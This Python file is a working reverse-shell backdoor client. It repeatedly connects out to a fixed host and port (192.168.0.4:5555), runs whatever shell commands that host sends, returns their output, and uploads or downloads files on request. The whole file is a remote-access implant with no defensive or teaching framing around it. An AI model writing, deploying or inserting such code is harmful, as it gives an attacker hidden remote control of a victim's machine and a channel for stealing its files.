import socket
import time
import subprocess
import json
import os

# Function to send data reliably by encoding it as JSON
def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

# Function to receive data reliably by continuously trying until successful
def reliable_receive():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to establish the initial connection
def connection():
    while True:
        time.sleep(20)  # Wait for a while before attempting to reconnect
        try:
            s.connect(('192.168.0.4', 5555))  # Connect to the specified address and port
            shell()  # Start the interactive shell
            s.close()  # Close the connection
            break
        except:
            connection()  # Retry the connection if an error occurs

# Function to upload a file to the connected server
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
    
# Function to download a file from the connected server
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout
    f.close()

# Main shell function to interact with the server
def shell():
    while True:
        command = reliable_receive()  # Receive a command from the server
        if command == 'exit':
            break  # Exit the loop if the command is 'exit'
        elif command == 'clear':
            pass  # Placeholder for clearing the console (not implemented)
        elif command[:3] == 'cd ':
            os.chdir(command[3:])  # Change the current working directory
        elif command[:8] == 'download':
            upload_file(command[9:])  # Upload a file to the server
        elif command[:6] == 'upload':
            download_file(command[7:])  # Download a file from the server
        else:
            # Execute the command using subprocess and send back the result
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)  # Send the result back to the server
        
# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process
connection()
